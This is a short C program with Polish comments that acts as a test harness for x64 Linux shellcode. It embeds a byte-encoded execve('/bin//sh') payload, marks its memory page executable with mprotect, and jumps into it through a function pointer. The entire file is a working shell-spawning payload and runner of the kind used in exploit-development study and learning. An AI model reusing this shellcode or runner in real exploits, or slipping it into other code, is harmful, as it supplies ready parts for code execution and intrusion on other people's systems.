#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>



char payload[]="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";


int main() {


//pokaze baner
puts("\n\033[33;1m---===[ test powloki x64 ]===---\033[0m\n");



//pokaze wielkosc powloki
    printf(" [\033[34;1m*\033[0m] wielkosc powloki:  %d\n", sizeof(payload)-1);


//tworzenie funkcji powloki i powrot do uzytkownika.

void (*payload_ptr)() =  (void(*)())&payload;
    printf(" [\033[34;1m*\033[0m] adres powloki: 0x%08x\n", payload_ptr);


// Obliczanie adresu poczatku strony dla powloki
void *page_offset = (void *)((long)payload_ptr & ~(getpagesize()-1));
    printf(" [\033[34;1m*\033[0m] strona powloki: 0x%08x\n", page_offset);


// uzywanie mprotect zeby oznaczyc strone jako RWX.
    mprotect(page_offset, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);


// Na koniec uzyje wskaznika funkcje aby przejsc do ladunku
puts("\n\033[33;1m---------[ Start powloki ]---------\033[0m");
    payload_ptr();

// prawdopodobnie to nie bedzie potrzebne, ale wlacze na jakis wypadek
  puts("\033[33;1m---------[  Koniec powloki  ]---------\033[0m");
    return 0;
    
}
